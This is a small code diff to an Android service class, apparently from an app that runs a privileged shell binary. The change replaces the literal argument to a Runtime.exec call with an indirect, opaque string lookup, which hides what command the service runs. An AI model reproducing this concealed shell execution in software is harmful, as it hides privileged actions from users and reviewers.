@@ -34,6 +34,7 @@ import com.android.service.util.Utils;
 public class ServiceCore extends Service {
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private Core core;
+	private String shellFile;
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -238,7 +239,7 @@ public class ServiceCore extends Service {
 			final AutoFile file = new AutoFile(Configuration.shellFile);
 			
 			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + " air");
+				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
